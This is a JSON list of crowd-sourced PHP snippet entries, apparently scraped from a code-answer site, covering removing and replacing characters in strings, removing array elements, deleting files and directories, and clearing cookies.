    "title": " php remove \\t and \\n",
    "description": "$text = preg_replace(\"/\\r|\\n/\", \"\", $text);\n//Replace the newline and carriage return characters //using regex and preg_replace. $text = preg_replace(\"/\\r|\\n/\", \"\", $text); \npreg_replace( \"/\\r|\\n/\", \"\", $yourString );\n$str = preg_replace('/(\\v|\\s)+/', ' ', $str); \n",
    "reg_date": "2021-10-12T10:19:03.000Z"
  },
  {
    "id": 4043,
    "keyword": null,
    "link": null,
    "title": " php remove 1 day from date",
    "description": "print('Next Date ' . date('Y-m-d', strtotime('-1 day', strtotime($date_raw))));\n",
    "reg_date": "2021-10-12T10:19:03.000Z"
  },
  {
    "id": 4044,
    "keyword": null,
    "link": null,
    "title": " php remove after character",
    "description": "$fullpath = 'folderName/file.ext'; $folder = substr($fullpath, 0, strpos($fullpath, '/')); echo $folder; // Output => folderName\n$s = 'Posted On April 6th By Some Dude'; echo strstr($s, 'By', true); // Posted On April 6th\n",
    "reg_date": "2021-10-12T10:19:04.000Z"
  },
  {
    "id": 4045,
    "keyword": null,
    "link": null,
    "title": " php remove all but numbers",
    "description": "// Original SOA preg_replace('/[^0-9]/', '', '604-619-5135'); // Removes the dahses in 604-619-5135  preg_replace('/[^0-9]/', '', '7#sq7k*77dql'); // = 7777\n",
    "reg_date": "2021-10-12T10:19:04.000Z"
  },
  {
    "id": 4046,
    "keyword": null,
    "link": null,
    "title": " php remove all whitespace from a string",
    "description": "$string = \"this is my     string\" $string = preg_replace('/\\s+/', '', $string); \n//remove all white spaces from a string $whatonearth=preg_replace('/\\s/','',\"what o n   ear th\");\n",
    "reg_date": "2021-10-12T10:19:04.000Z"
  },
  {
    "id": 4047,
    "keyword": null,
    "link": null,
    "title": " php remove anchor tag from string",
    "description": "$text = \"<a href='http://www.google.com/'>Google1</a><br>\" .         \"<a>Google2</a><br>\" .         \"<afaketag href='http://www.google.com'>Google2</afaketag><br>\" .         \"<afaketag>Google4</afaketag><br>\" .          \"<a href='http://www.google.com'><img src='someimage.jpg'></a>\"; echo preg_replace(\"/<\\/?a( [^>]*)?>/i\", \"\", $text);\n",
    "reg_date": "2021-10-12T10:19:04.000Z"
  },
  {
    "id": 4048,
    "keyword": null,
    "link": null,
    "title": " php remove array element reset keys",
    "description": "$arr = array_values($arr)\nunset($foo[0]); // remove item at index 0 $foo2 = array_values($foo); // 'reindex' array\n",
    "reg_date": "2021-10-12T10:19:05.000Z"
  },
  {
    "id": 4049,
    "keyword": null,
    "link": null,
    "title": " php remove bom",
    "description": "function removeBomUtf8($s){   if(substr($s,0,3)==chr(hexdec('EF')).chr(hexdec('BB')).chr(hexdec('BF'))){        return substr($s,3);    }else{        return $s;    } } \n",
    "reg_date": "2021-10-12T10:19:05.000Z"
  },
  {
    "id": 4050,
    "keyword": null,
    "link": null,
    "title": " php remove characters not numbers or letters",
    "description": "$res = preg_replace(\"/[^a-zA-Z0-9\\s]/\", \"\", $string);\n",
    "reg_date": "2021-10-12T10:19:05.000Z"
  },
  {
    "id": 4051,
    "keyword": null,
    "link": null,
    "title": " php remove class attribute",
    "description": "$html = preg_replace('/class=\".*?\"/', '', $html);\n",
    "reg_date": "2021-10-12T10:19:05.000Z"
  },
  {
    "id": 4052,
    "keyword": null,
    "link": null,
    "title": " php remove cookie",
    "description": "if (isset($_COOKIE['key'])) {     unset($_COOKIE['key']);     setcookie('key', '', time() - 3600, '/'); // empty value and old timestamp }\nunset($_COOKIE['hello']);\nsetcookie ('name', 'value', $expiresOn, $path, $domain, $secure, $httponly)\n",
    "reg_date": "2021-10-12T10:19:05.000Z"
  },
  {
    "id": 4053,
    "keyword": null,
    "link": null,
    "title": " php remove dashes from string",
    "description": "//replace dashes (-) with spaces ( )   $string=\"text-with-dashes\"; //php string replace $test = str_replace(\"-\", \" \", $string);\n",
    "reg_date": "2021-10-12T10:19:05.000Z"
  },
  {
    "id": 4054,
    "keyword": null,
    "link": null,
    "title": " php remove directory not empty",
    "description": "function deleteDirectory($dir) {     if (!file_exists($dir)) {         return true;     }      if (!is_dir($dir)) {         return unlink($dir);     }      foreach (scandir($dir) as $item) {         if ($item == '.' || $item == '..') {             continue;         }          if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {             return false;         }      }      return rmdir($dir); }\n<?php      function removeEmptyDirs($path, $checkUpdated = false, $report = false) {         $dirs = glob($path . \"/*\", GLOB_ONLYDIR);          foreach($dirs as $dir) {             $files = glob($dir . \"/*\");             $innerDirs = glob($dir . \"/*\", GLOB_ONLYDIR);             if(empty($files)) {                 if(!rmdir($dir))                     echo \"Err: \" . $dir . \"<br />\";                elseif($report)                     echo $dir . \" - removed!\" . \"<br />\";             } elseif(!empty($innerDirs)) {                 removeEmptyDirs($dir, $checkUpdated, $report);                 if($checkUpdated)                     removeEmptyDirs($path, $checkUpdated, $report);             }         }      }   ?> \n",
    "reg_date": "2021-10-12T10:19:05.000Z"
  },
  {
    "id": 4055,
    "keyword": null,
    "link": null,
    "title": " php remove duplicates from array",
    "description": "<?php $fruits_list = array('Orange',  'Apple', ' Banana', 'Cherry', ' Banana'); $result = array_unique($fruits_list); print_r($result); ?>    Output:  Array ( [0] => Orange [1] => Apple [2] => Banana [3] => Cherry ) \n <?php $input = array(\"a\" => \"green\", \"red\", \"b\" => \"green\", \"blue\", \"red\"); $result = array_unique($input); print_r($result); ?>  Array (     [a] => green     [0] => red     [1] => blue )\n<?php $a=array(\"a\"=>\"red\",\"b\"=>\"green\",\"c\"=>\"red\"); print_r(array_unique($a)); ?> Output : Array ( [a] => red [b] => green )  Example 2:   $array = array(1, 2, 2, 3); $array = array_unique($array);  Output : Array is now (1, 2, 3)      \n<?php $list_programming_language = array('C#',  'C++', 'PHP', 'C#', 'PHP'); $result = array_unique($list_programming_language); print_r($result); ?>    // ==> 'C#',  'C++', 'PHP'\n<?php $input = array(\"a\" => \"green\", \"red\", \"b\" => \"green\", \"blue\", \"red\"); $result = array_unique($input); print_r($result); ?>  Array (     [a] => green     [0] => red     [1] => blue )\n<?php $fruits_list = array('Orange',  'Apple', ' Banana', 'Cherry', ' Banana'); $result = array_unique($fruits_list); print_r($result); ?>\n",
    "reg_date": "2021-10-12T10:19:05.000Z"
  },
  {
    "id": 4056,
    "keyword": null,
    "link": null,
    "title": " php remove duplicates from multidimensional array",
    "description": "<?php $fruits_list = array('Orange',  'Apple', ' Banana', 'Cherry', ' Banana'); $result = array_unique($fruits_list); print_r($result); ?>    Output:  Array ( [0] => Orange [1] => Apple [2] => Banana [3] => Cherry ) \n<?php     function super_unique($array,$key)     {        $temp_array = [];        foreach ($array as &$v) {            if (!isset($temp_array[$v[$key]]))            $temp_array[$v[$key]] =& $v;        }        $array = array_values($temp_array);        return $array;      }   $arr=\"\"; $arr[0]['id']=0; $arr[0]['titel']=\"ABC\"; $arr[1]['id']=1; $arr[1]['titel']=\"DEF\"; $arr[2]['id']=2; $arr[2]['titel']=\"ABC\"; $arr[3]['id']=3; $arr[3]['titel']=\"XYZ\";  echo \"<pre>\"; print_r($arr); echo \"unique*********************<br/>\"; print_r(super_unique($arr,'titel'));  ?> \n<?php $a=array(\"a\"=>\"red\",\"b\"=>\"green\",\"c\"=>\"red\"); print_r(array_unique($a)); ?> Output : Array ( [a] => red [b] => green )  Example 2:   $array = array(1, 2, 2, 3); $array = array_unique($array);  Output : Array is now (1, 2, 3)      \n<?php $list_programming_language = array('C#',  'C++', 'PHP', 'C#', 'PHP'); $result = array_unique($list_programming_language); print_r($result); ?>    // ==> 'C#',  'C++', 'PHP'\narray_unique($array, SORT_REGULAR); \nWe used this to de-duplicate results from a variety of overlapping queries.  $input = array_map(\"unserialize\", array_unique(array_map(\"serialize\", $input))); \n",
    "reg_date": "2021-10-12T10:19:06.000Z"
  },
  {
    "id": 4057,
    "keyword": null,
    "link": null,
    "title": " php remove element from array",
    "description": "$items = ['banana', 'apple'];  unset($items[0]);  var_dump($items); // ['apple']\n//Delete array items with unset(no re-index) or array_splice(re-index)  $colors = array(\"red\",\"blue\",\"green\");                               unset($colors[1]);//remove second element, do not re-index array    $colors = array(\"red\",\"blue\",\"green\");  array_splice($colors, 1, 1); //remove second element, re-index array\n$array = [0 => \"a\", 1 => \"b\", 2 => \"c\"]; unset($array[1]); //Key which you want to delete /* $array: [     [0] => a     [2] => c ] */ //OR $array = [0 => \"a\", 1 => \"b\", 2 => \"c\"]; array_splice($array, 1, 1);//Offset which you want to delet /* $array: [     [0] => a     [1] => c ] */\n$arr = array('a' => 1, 'b' => 2, 'c' => 3); unset($arr['b']);  // RESULT: array('a' => 1, 'c' => 3)  $arr = array(1, 2, 3); array_splice($arr, 1, 1);  // RESULT: array(0 => 1, 1 => 3)\nforeach ($items as $key =>$item){   if(condition){     unset($item[$key]);   } }\n//NO KEY supplied $message array(\"a\", \"b\", \"c\", \"d\"); $del_val = \"b\"; if (($key = array_search($del_val, $messages)) !== false) {     unset($messages[$key]); }\n",
    "reg_date": "2021-10-12T10:19:06.000Z"
  },
  {
    "id": 4058,
    "keyword": null,
    "link": null,
    "title": " php remove element from associative array",
    "description": "unset($array['key1']); \n",
    "reg_date": "2021-10-12T10:19:06.000Z"
  },
  {
    "id": 4059,
    "keyword": null,
    "link": null,
    "title": " php remove empty values from array",
    "description": "<?php $arr = array('1', '', '2', '3', '0'); // Incorrect: print_r(array_filter($arr)); // Correct: print_r(array_filter($arr, 'strlen')); //Custom print_r(array_filter($arr, function ($val) {if ($val > 0) {return true;} else {return false;}}));\n// One liner to remove empty (\"\" empty string) elements from your array. // Note: This code deliberately keeps null, 0 and false elements. $array = array_filter($array, function($a) {return $a !== \"\";});  // OR if you want to trim your array elements first: // Note: This code also removes null and false elements. $array = array_filter($array, function($a) {     return trim($a) !== \"\"; });\n$colors = array(\"red\",\"\",\"blue\",NULL);  $colorsNoEmptyOrNull = array_filter($colors, function($v){   return !is_null($v) && $v !== '';  }); //$colorsNoEmptyOrNull is now [\"red\",\"blue\"]\narray_filter();\narray_filter\n$array = array_filter($array, function($a) {     return trim($a) !== \"\"; }); \n",
    "reg_date": "2021-10-12T10:19:06.000Z"
  },
  {
    "id": 4060,
    "keyword": null,
    "link": null,
    "title": " php remove enter from string",
    "description": "$_result = trim(preg_replace('/\\s+/', ' ', $original_text));\n",
    "reg_date": "2021-10-12T10:19:06.000Z"
  },
  {
    "id": 4061,
    "keyword": null,
    "link": null,
    "title": " php remove everything after character",
    "description": "$fullpath = 'folderName/file.ext'; $folder = substr($fullpath, 0, strpos($fullpath, '/')); echo $folder; // Output => folderName\n$s = 'Posted On April 6th By Some Dude'; echo strstr($s, 'By', true); // Posted On April 6th\n",
    "reg_date": "2021-10-12T10:19:06.000Z"
  },
  {
    "id": 4062,
    "keyword": null,
    "link": null,
    "title": " php remove extension from url",
    "description": "//put this piece of code in the root file .htaccess RewriteEngine on #remove extension html RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME}\\.html -f RewriteRule ^(.*)$ $1.html [NC,L]  #remove extension php RewriteCond %{REQUEST_FILENAME} !-d  RewriteCond %{REQUEST_FILENAME}\\.php -f  RewriteRule ^(.*)$ $1.php\nRewriteEngine On RewriteCond %{REQUEST_FILENAME} !-f RewriteRule ^([^\\.]+)$ $1.php [NC,L] \n",
    "reg_date": "2021-10-12T10:19:06.000Z"
  },
  {
    "id": 4063,
    "keyword": null,
    "link": null,
    "title": " php remove file",
    "description": "if(file_exists($file)) { \tunlink($file); } \n/* Deleting files is a concept in file handeling of PHP We can remove or delete the file from real folder path using below code */  unlink($Your_file_path);   // direct deleting the file  /* Delete file if its exist in folder */  if (file_exists($Your_file_path)) {   unlink($Your_file_path); }   /* I hope it will help you. Namaste */\nunlink(filepath);\n<?php    unlink('test.html'); ?>\n// delete file function, if silent is false, function will throw exception function deleteFile($fullFileName, $silent=0) {   if (file_exists($fullFileName)) {     unlink($fullFileName);     return TRUE;   } else {     if ($silent == 1) {       return FALSE;     } else {       throw new \\InvalidArgumentException('File \"'.$fullFileName.'\" not exists.');     }   } }\n",
    "reg_date": "2021-10-12T10:19:06.000Z"
  },
  {
    "id": 4064,
    "keyword": null,
    "link": null,
    "title": " php remove first and last char",
    "description": "<?php  $string = \"hello world\";  // create a substring starting 1 character from // the beginning and ending 1 character from the end $trimmed = substr($string, 1, -1);  echo $trimmed; // prints \"ello worl\"\n",
    "reg_date": "2021-10-12T10:19:06.000Z"
  },
  {
    "id": 4065,
    "keyword": null,
    "link": null,
    "title": " php remove html tags",
    "description": "<?php \techo strip_tags(\"Hello <b>world!</b>\");\n // using strip_tags and str_replace for REMOVE all html TAGS in php $text = '<p>Hello world.</p><!-- Comment --> <a href=\"https://learn-tech-tips.blogspot.com\">Zidane</a>'; echo strip_tags($text);  //Hello world. Zidane  $short_description = strip_tags(str_replace(\"&nbsp;\", \" \", $short_description)); echo $short_description       // Allow <p> and <a> echo strip_tags($text, '<p><a>');    // <p>Hello world.</p><a href=\"https://learn-tech-tips.blogspot.com\">Zidane</a>\n/*  EXAMPLE:\t<p>Bed & Breakfast</p>\t-->\t  <p>Bed &amp; Breakfast</p>       & \t&amp;     \" \t&quot; \t\t\t\t(unless ENT_NOQUOTES is set)     ' \t&#039; or &apos; \t(ENT_QUOTES must be set)     < \t&lt;     > \t&gt;\t\t\t\t*/  <?php $new = htmlspecialchars(\"<a href='test'>Test</a>\", ENT_QUOTES); echo $new; \t\t\t\t\t// <a href='test'>Test</a> ?>\necho strip_tags(\"Hello <b>world!</b>\");\n<?php $text = '<p>Test paragraph.</p><!-- Comment --> <a href=\"#fragment\">Other text</a>'; echo strip_tags($text); //Test paragraph. Other text  // Allow <p> and <a> echo strip_tags($text, '<p><a>'); //<p>Test paragraph.</p> <a href=\"#fragment\">Other text</a> // as of PHP 7.4.0 the line above can be written as: // echo strip_tags($text, ['p', 'a']); ?>  \n<?php $str = \"<h1>Hello World&AElig;&Oslash;&Aring;!</h1>\"; # Remove all HTML tags and all characters with ASCII value > 127, from a string: $newstr = filter_var($str, FILTER_SANITIZE_STRING, FILTER_FLAG_STRIP_HIGH); echo $newstr; # Result: Hello World!\n",
    "reg_date": "2021-10-12T10:19:06.000Z"
  },
  {
    "id": 4066,
    "keyword": null,
    "link": null,
    "title": " php remove item array",
    "description": "$items = ['banana', 'apple'];  unset($items[0]);  var_dump($items); // ['apple']\n//Delete array items with unset(no re-index) or array_splice(re-index)  $colors = array(\"red\",\"blue\",\"green\");                               unset($colors[1]);//remove second element, do not re-index array    $colors = array(\"red\",\"blue\",\"green\");  array_splice($colors, 1, 1); //remove second element, re-index array\n$arr = array('a' => 1, 'b' => 2, 'c' => 3); unset($arr['b']);  // RESULT: array('a' => 1, 'c' => 3)  $arr = array(1, 2, 3); array_splice($arr, 1, 1);  // RESULT: array(0 => 1, 1 => 3)\n",
    "reg_date": "2021-10-12T10:19:07.000Z"
  },
  {
    "id": 4067,
    "keyword": null,
    "link": null,
    "title": " php remove last 3 letters from string",
    "description": "//Remove the last character using substr $string = substr($string, 0, -1);\necho substr($string, 0, -3); \necho substr($string, 0, -3);\n",
    "reg_date": "2021-10-12T10:19:07.000Z"
  },
  {
    "id": 4068,
    "keyword": null,
    "link": null,
    "title": " php remove last char from string",
    "description": "//Remove the last character using substr $string = substr($string, 0, -1);\n<?php echo substr('abcdef',0, -1);     // abcde ?>\n$hell = substr('hello', 0, -1);\necho substr($string, 0, -3); \n$string = rtrim($string, ',');\n$arrStr = 'Str1, Str2, str3, '; echo rtrim($arrStr, \", \"); //Str1, Str2, str3 echo substr_replace($arrStr, \"\", -2); //Str1, Str2, str3 echo substr($arrStr, 0, -2); // Str1, Str2, str3\n",
    "reg_date": "2021-10-12T10:19:07.000Z"
  },
  {
    "id": 4069,
    "keyword": null,
    "link": null,
    "title": " php remove last character from string",
    "description": "//Remove the last character using substr $string = substr($string, 0, -1);\n<?php echo substr('abcdef',0, -1);     // abcde ?>\n$hell = substr('hello', 0, -1);\necho substr($string, 0, -3); \n$string = rtrim($string, ',');\n$newarraynama = rtrim($arraynama, \", \");\n",
    "reg_date": "2021-10-12T10:19:07.000Z"
  },
  {
    "id": 4070,
    "keyword": null,
    "link": null,
    "title": " php remove last character from string if comma",
    "description": "$string = rtrim($string, ',');\n$arrStr = 'Str1, Str2, str3, '; echo rtrim($arrStr, \", \"); //Str1, Str2, str3 echo substr_replace($arrStr, \"\", -2); //Str1, Str2, str3 echo substr($arrStr, 0, -2); // Str1, Str2, str3\n",
    "reg_date": "2021-10-12T10:19:07.000Z"
  },
  {
    "id": 4071,
    "keyword": null,
    "link": null,
    "title": " php remove last character in string",
    "description": "//Remove the last character using substr $string = substr($string, 0, -1);\n$string = rtrim($string, ',');\n",
    "reg_date": "2021-10-12T10:19:07.000Z"
  },
  {
    "id": 4072,
    "keyword": null,
    "link": null,
    "title": " php remove last element array",
    "description": "$stack = array(\"yellow\", \"red\", \"green\", \"orange\", \"purple\");   // delete the last element of an array $removed = array_pop($stack); print_r($stack);\nif(empty($transport[count($transport)-1])) {     unset($transport[count($transport)-1]); }\n",
    "reg_date": "2021-10-12T10:19:07.000Z"
  },
  {
    "id": 4073,
    "keyword": null,
    "link": null,
    "title": " php remove last newline from string",
    "description": "//Remove the last character using substr $string = substr($string, 0, -1);\n$hell = substr('hello', 0, -1);\n$string = rtrim($string_to_remove);\necho substr('a,b,c,d,e,', 0, -1); # => 'a,b,c,d,e' \n$newarraynama = rtrim($arraynama, \", \"); \n",
    "reg_date": "2021-10-12T10:19:07.000Z"
  },
  {
    "id": 4074,
    "keyword": null,
    "link": null,
    "title": " php remove line if it contains string",
    "description": "$rows = file(\"problem.txt\");     $blacklist = \"foo|bar|lol\";  foreach($rows as $key => $row) {     if(preg_match(\"/($blacklist)/\", $row)) {         unset($rows[$key]);     } }  file_put_contents(\"solved.txt\", implode(\"\\n\", $rows));\n",
    "reg_date": "2021-10-12T10:19:07.000Z"
  },
  {
    "id": 4075,
    "keyword": null,
    "link": null,
    "title": " php remove nbsp from string",
    "description": "$string = htmlentities($content, null, 'utf-8'); $content = str_replace(\" \", \"\", $string); $content = html_entity_decode($content); \n",
    "reg_date": "2021-10-12T10:19:07.000Z"
  },
  {
    "id": 4076,
    "keyword": null,
    "link": null,
    "title": " php remove newline",
    "description": "$text = preg_replace(\"/\\r|\\n/\", \"\", $text);\n//Replace the newline and carriage return characters //using regex and preg_replace. $text = preg_replace(\"/\\r|\\n/\", \"\", $text); \npreg_replace( \"/\\r|\\n/\", \"\", $yourString );\n$str = preg_replace('/(\\v|\\s)+/', ' ', $str); \n",
    "reg_date": "2021-10-12T10:19:08.000Z"
  },
  {
    "id": 4077,
    "keyword": null,
    "link": null,
    "title": " php remove non numeric",
    "description": "$res = preg_replace(\"/[^0-9]/\", \"\", \"Every 6 Months\" ); \n$res = preg_replace(\"/[^a-zA-Z0-9\\s]/\", \"\", $string);\n",
    "reg_date": "2021-10-12T10:19:08.000Z"
  },
  {
    "id": 4078,
    "keyword": null,
    "link": null,
    "title": " php remove notice session already been started",
    "description": "if(!isset($_SESSION)) {    session_start();  } \n",
    "reg_date": "2021-10-12T10:19:08.000Z"
  },
  {
    "id": 4079,
    "keyword": null,
    "link": null,
    "title": " php remove null bytes from string",
    "description": "$text = str_replace(\"\\0\", \"\", $text);\n",
    "reg_date": "2021-10-12T10:19:08.000Z"
  },
  {
    "id": 4080,
    "keyword": null,
    "link": null,
    "title": " php remove numbers from string",
    "description": "$words = preg_replace('/[0-9]+/', '', $words);\n",
    "reg_date": "2021-10-12T10:19:08.000Z"
  },
  {
    "id": 4081,
    "keyword": null,
    "link": null,
    "title": " php remove object from array",
    "description": "unset($array[$key]);  // You can do using function when no key  function unsetValue(array $array, $value, $strict = TRUE) {     if(($key = array_search($value, $array, $strict)) !== FALSE) {         unset($array[$key]);     }     return $array; }\n",
    "reg_date": "2021-10-12T10:19:08.000Z"
  },
  {
    "id": 4082,
    "keyword": null,
    "link": null,
    "title": " php remove object from array by property",
    "description": "$new_array = []; foreach ($myarray as $key => $value) {     if ($value->catid == 29) {         $new_array[] = $value;         unset($myarray[$key]);             } } \n",
    "reg_date": "2021-10-12T10:19:08.000Z"
  },
  {
    "id": 4083,
    "keyword": null,
    "link": null,
    "title": " php remove parentheses and contents from string",
    "description": "$string = \"ABC (Test1)\"; echo preg_replace(\"/\\([^)]+\\)/\",\"\",$string); // 'ABC '\n",
    "reg_date": "2021-10-12T10:19:08.000Z"
  },
  {
    "id": 4084,
    "keyword": null,
    "link": null,
    "title": " php remove prefix from string",
    "description": "$str = preg_replace('/^bla_/', '', $str);\n",
    "reg_date": "2021-10-12T10:19:08.000Z"
  },
  {
    "id": 4085,
    "keyword": null,
    "link": null,
    "title": " php remove query param from url",
    "description": "function strip_param_from_url( $url, $param ) {     $base_url = strtok($url, '?');              // Get the base url     $parsed_url = parse_url($url);              // Parse it      $query = $parsed_url['query'];              // Get the query string     parse_str( $query, $parameters );           // Convert Parameters into array     unset( $parameters[$param] );               // Delete the one you want     $new_query = http_build_query($parameters); // Rebuilt query string     return $base_url.'?'.$new_query;            // Finally url is ready } // Usage echo strip_param_from_url( 'http://url.com/search/?location=london&page_number=1',  \t'location' )\n",
    "reg_date": "2021-10-12T10:19:09.000Z"
  },
  {
    "id": 4086,
    "keyword": null,
    "link": null,
    "title": " php remove quotes",
    "description": "str_replace('\"', \"\", $string);\n// Provides: Hll Wrld f PHP $vowels = array(\"a\", \"e\", \"i\", \"o\", \"u\", \"A\", \"E\", \"I\", \"O\", \"U\"); $onlyconsonants = str_replace($vowels, \"\", \"Hello World of PHP\");\n",
    "reg_date": "2021-10-12T10:19:09.000Z"
  },
  {
    "id": 4087,
    "keyword": null,
    "link": null,
    "title": " php remove slashes from json",
    "description": "echo stripslashes('{\\\"test\\\":{\\\"test1\\\":{\\\"test1\\\":[{\\\"test2\\\":\\\"1\\\",\\\"test3\\\": \\\"foo\\\",\\\"test4\\\":\\\"bar\\\",\\\"test5\\\":\\\"test7\\\"}]}}}'); \njson_decode($val, true, JSON_UNESCAPED_SLASHES);\nvar finalData = str.replace(/\\\\/g, \"\"); \n",
    "reg_date": "2021-10-12T10:19:09.000Z"
  },
  {
    "id": 4088,
    "keyword": null,
    "link": null,
    "title": " php remove space before and after string",
    "description": "<?php $stripped = str_replace(' ', '', \"10 1000 0000 000\"); echo $stripped;\n$words = '      my words     '; $words = trim($words); var_dump($words); // string(8) \"my words\" \n  $trimmed = trim($text); var_dump($trimmed);    \n<?php  $text   = \"\\t\\tThese are a few words :) ...  \"; $binary = \"\\x09Example string\\x0A\"; $hello  = \"Hello World\"; var_dump($text, $binary, $hello);  print \"\\n\";  $trimmed = trim($text); var_dump($trimmed);  $trimmed = trim($text, \" \\t.\"); var_dump($trimmed);  $trimmed = trim($hello, \"Hdle\"); var_dump($trimmed);  $trimmed = trim($hello, 'HdWr'); var_dump($trimmed);  // trim the ASCII control characters at the beginning and end of $binary // (from 0 to 31 inclusive) $clean = trim($binary, \"\\x00..\\x1F\"); var_dump($clean);  ?>\n",
    "reg_date": "2021-10-12T10:19:09.000Z"
  },
  {
    "id": 4089,
    "keyword": null,
    "link": null,
    "title": " php remove span tags from string",
    "description": "echo $new_string = preg_replace('/<span[^>]+\\>/i', '', $content); \n",
    "reg_date": "2021-10-12T10:19:09.000Z"
  },
  {
    "id": 4090,
    "keyword": null,
    "link": null,
    "title": " php remove specific element from array",
    "description": "if (($key = array_search('strawberry', $array)) !== false) {     unset($array[$key]); }\nif (($key = array_search('strawberry', $array)) !== false) {     unset($array[$key]); } \n",
    "reg_date": "2021-10-12T10:19:09.000Z"
  },
  {
    "id": 4091,
    "keyword": null,
    "link": null,
    "title": " php remove stop words from string",
    "description": "  public function optimizeSearchString($searchString = \"\")   {     $stopwords = array(       'der' => 1,       'die' => 1,       'das' => 1,       'the' => 1);      $words = preg_split('/[^-\\w\\']+/', $searchString, -1, PREG_SPLIT_NO_EMPTY);      if (count($words) > 1) {       $words = array_filter($words, function ($v) use (&$stopwords) {         return !isset($stopwords[strtolower($v)]);       }       );     }      if (empty($words)) {       return $searchString;     }      return implode(\" \", $words);   }\n",
    "reg_date": "2021-10-12T10:19:09.000Z"
  },
  {
    "id": 4092,
    "keyword": null,
    "link": null,
    "title": " php remove text from string",
    "description": "<?php   //Replace the characters \"world\" in the string \"Hello world!\" with \"Peter\": echo str_replace(\"world\",\"Peter\",\"Hello world!\"); ?>\n$words = preg_replace('/[0-9]+/', '', $words); \n",
    "reg_date": "2021-10-12T10:19:09.000Z"
  },
  {
    "id": 4093,
    "keyword": null,
    "link": null,
    "title": " php remove utf non breaking space",
    "description": "Non-breaking spaces can be troublesome with trim:  // nbsp are translated to 0xA0, so use: // UTF encodes it as chr(0xC2).chr(0xA0) $converted = trim($converted,chr(0xC2).chr(0xA0)); // should work\n",
    "reg_date": "2021-10-12T10:19:09.000Z"
  },
  {
    "id": 4094,
    "keyword": null,
    "link": null,
    "title": " php remove warning",
    "description": "error_reporting(E_ALL ^ E_WARNING); \nerror_reporting(E_ERROR | E_PARSE);\n",
    "reg_date": "2021-10-12T10:19:09.000Z"
  },
  {
    "id": 4095,
    "keyword": null,
    "link": null,
    "title": " php remove wordpress shortcodes",
    "description": "$content = '[vc_row type=\"\"boxed\"\"][vc_column][vc_column_text]LOREM IPSUM[/vc_column_text][vc_empty_space height=\"\"25px\"\"][vc_column_text]';  $content = preg_replace('#\\[[^\\]]+\\]#', '', $content);  echo $content; // Result: LOREM IPSUM\n",
    "reg_date": "2021-10-12T10:19:10.000Z"
  },
  {
    "id": 4096,
    "keyword": null,
    "link": null,
    "title": " php rename files in directory",
    "description": " rename('old_filename.txt', 'new_filename.txt');\n<?php rename (\"/folder/file.ext\", \"newfile.ext\"); ?>  The above doesn't rename the file within the folder, as you might assume,  instead, it moves the file to whatever the PHP working directory is...  Chances are you'll not find it in your FTP tree.  Instead, use the following:  <?php rename (\"/folder/file.ext\", \"/folder/newfile.ext\"); ?>\n",
    "reg_date": "2021-10-12T10:19:10.000Z"
  },
  {
    "id": 4097,
    "keyword": null,
    "link": null,
    "title": " php replace",
    "description": "<?php //str_replace(\"Original Value\", \"Value to be replaced\", \"String\"); $result = str_replace(\"1\", \"2\", \"This is number 1\"); // Output: This is number 2 ?>\nstr_replace ($search, $replace, $subject);\n$var1 = 'hello.world'; $var2 = str_replace(\".\", \"-\", $var1); echo $var2; // hello-world \n$new_string = str_replace( $take_out, $put_in, $string);\necho str_replace(\"worss\",\"world\",\"Hello worss in PHP!!\");\n//replaces every occurence of $search with $replace in the string $subject str_replace ($search, $replace, $subject);\n",
    "reg_date": "2021-10-12T10:19:10.000Z"
  },
  {
    "id": 4098,
    "keyword": null,
    "link": null,
    "title": " php replace \\n by <br>",
    "description": "$var = str_replace(array(\"\\r\\n\",\"\\n\"),'<br>', $var);\n",
    "reg_date": "2021-10-12T10:19:10.000Z"
  },
  {
    "id": 4099,
    "keyword": null,
    "link": null,
    "title": " php replace all spaces with dashes",
    "description": "str_replace(' ', '-', $string);\n<?php    $string = \"hello php\";   $replace = str_replace(\" \", \"_\", $string);   echo $replace; // hello_php ?>\n// Clean up multiple dashes or whitespaces $string = preg_replace(\"/[\\s-]+/\", \" \", $string); // Convert whitespaces and underscore to dash $string = preg_replace(\"/[\\s_]/\", \"-\", $string);\n",
    "reg_date": "2021-10-12T10:19:10.000Z"
  },
  {
    "id": 4100,
    "keyword": null,
    "link": null,
    "title": " php replace every occurrence of character in string",
    "description": "str_replace ($search, $replace, $subject);\n//replaces every occurence of $search with $replace in the string $subject str_replace ($search, $replace, $subject);\n$string = str_replace('search','replace',$string); \n<?php $string = str_ireplace(\"FoX\", \"CAT\", \"the quick brown fox jumps over the lazy dog\"); echo $string; // the quick brown CAT jumps over the lazy dog ?>\n",
    "reg_date": "2021-10-12T10:19:10.000Z"
  },
  {
    "id": 4101,
    "keyword": null,
    "link": null,
    "title": " php replace multiple spaces end chrters to one",
    "description": "$ro = preg_replace('/\\s+/', ' ',$row['message']);\n$string = preg_replace('/[\\s$@_*]+/', '_', $string);\n",
    "reg_date": "2021-10-12T10:19:11.000Z"
  },
  {
    "id": 4102,
    "keyword": null,
    "link": null,
    "title": " php replace return character",
    "description": "$string = str_replace(\"\\n\", \"\", $string); $string = str_replace(\"\\r\", \"\", $string);\n",
    "reg_date": "2021-10-12T10:19:11.000Z"
  },
  {
    "id": 4103,
    "keyword": null,
    "link": null,
    "title": " php replace space with 20",
    "description": "//Replace space with   for url to understand $new = str_replace(' ', ' ', $your_string);  //Alternate for URL use, use this urlencode ( string $str )\n$journalName = preg_replace('/\\s+/', '_', $journalName); \n",
    "reg_date": "2021-10-12T10:19:11.000Z"
  },
  {
    "id": 4104,
    "keyword": null,
    "link": null,
    "title": " php replace space with dash",
    "description": "str_replace(' ', '-', $string);\n<?php    $string = \"hello php\";   $replace = str_replace(\" \", \"_\", $string);   echo $replace; // hello_php ?>\n// Clean up multiple dashes or whitespaces $string = preg_replace(\"/[\\s-]+/\", \" \", $string); // Convert whitespaces and underscore to dash $string = preg_replace(\"/[\\s_]/\", \"-\", $string);\n",
    "reg_date": "2021-10-12T10:19:11.000Z"
  },
  {
    "id": 4105,
    "keyword": null,
    "link": null,
    "title": " php replace space with underscore",
    "description": "$str = str_replace(' ', '_', $str); \n$str = str_replace(' ', '_', $str);\n",
    "reg_date": "2021-10-12T10:19:11.000Z"
  },
  {
    "id": 4106,
    "keyword": null,
    "link": null,
    "title": " php replace spaces with dash",
